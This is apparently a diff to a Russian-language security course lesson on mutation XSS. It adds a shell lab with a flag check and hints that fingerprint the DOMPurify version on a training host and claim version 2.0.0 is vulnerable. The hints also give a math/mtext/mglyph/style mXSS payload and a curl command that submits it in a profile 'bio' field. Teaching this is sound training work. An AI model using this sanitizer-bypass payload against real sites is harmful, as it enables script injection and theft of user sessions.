@@ -12,6 +12,19 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Почему браузерный парсер HTML и санитайзер видят разное дерево и как из-за этого проскакивает XSS."
+lab:
+  kind: shell
+  title: "Практика: mXSS обходит DOMPurify"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Определи санитайзер и версию: curl -s https://target.local/js/dompurify.min.js | head -c 60"
+    - "Версия 2.0.0 уязвима к mXSS: санитайзер и браузер строят РАЗНОЕ дерево."
+    - "Пейлоад: <math><mtext><table><mglyph><style><img src=x onerror=...>"
+    - "Отправь payload в bio: curl -s 'https://target.local/profile?bio=<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>' -b 'session=me' > found.txt"
+
 ---
 
 ## Задача
